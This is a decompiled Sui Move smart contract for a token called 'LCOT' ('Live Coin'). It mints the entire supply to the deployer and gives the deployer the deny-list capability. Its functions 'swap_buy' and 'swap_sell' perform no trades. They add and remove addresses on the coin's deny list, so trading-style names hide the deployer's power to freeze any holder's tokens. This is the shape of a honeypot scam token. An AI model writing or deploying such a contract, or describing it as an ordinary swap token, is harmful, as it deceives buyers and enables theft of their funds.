module 0xc54d194dbc16454aca09edcec38c1a1e7a49a849421569b18ea4c27e784006d::lcot {
    struct LCOT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: LCOT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<LCOT>(arg0, 9, b"LCOT", b"Live Coin", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmWxdeFzNzD6FTnuxmi4NaYM3Z2LLfNxXVB4sCmj73UTEN"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<LCOT>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<LCOT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<LCOT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<LCOT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LCOT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<LCOT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LCOT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<LCOT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

